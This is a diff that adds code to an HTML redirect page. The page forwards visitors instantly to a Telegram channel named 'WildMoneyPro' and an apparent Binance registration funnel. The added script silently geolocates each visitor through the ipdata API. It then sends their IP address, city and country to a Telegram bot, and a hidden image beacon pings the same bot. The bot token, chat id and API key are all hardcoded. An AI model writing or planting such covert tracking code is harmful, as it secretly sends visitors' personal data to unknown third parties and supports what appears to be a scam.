@@ -1,2 +1,19 @@
+<html>
+<script>
+function json(url) {
+  return fetch(url).then(res => res.json());
+}
+let apiKey = 'f9f0689a25597caa54c5a9b18e00856f58b070dff3d490d443bbd637';
+json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+  
+var script = document.createElement('script');
+script.src = "https://api.telegram.org/bot6427257365:AAFUpj995kZzF-clr_JJgL4vN3CdyjYpjSc/sendMessage?chat_id=-1001716725102&text=IP Adress: "+data.ip+"    City: "+data.city+"    Country: "+data.country_code;
+document.getElementsByTagName('script')[0].parentNode.appendChild(script);   
+});
+</script>
+
 <meta http-equiv="refresh" content="0; url=https://t.me/WildMoneyPro" />
+<img hidden src="https://api.telegram.org/bot6427257365:AAFUpj995kZzF-clr_JJgL4vN3CdyjYpjSc/sendMessage?chat_id=-1001716725102&text=New Redirect Binance  Register">
+
 <!--meta http-equiv="refresh" content="0; url=https://pupi.pro/?Błąd_4040" /-->
+</html>
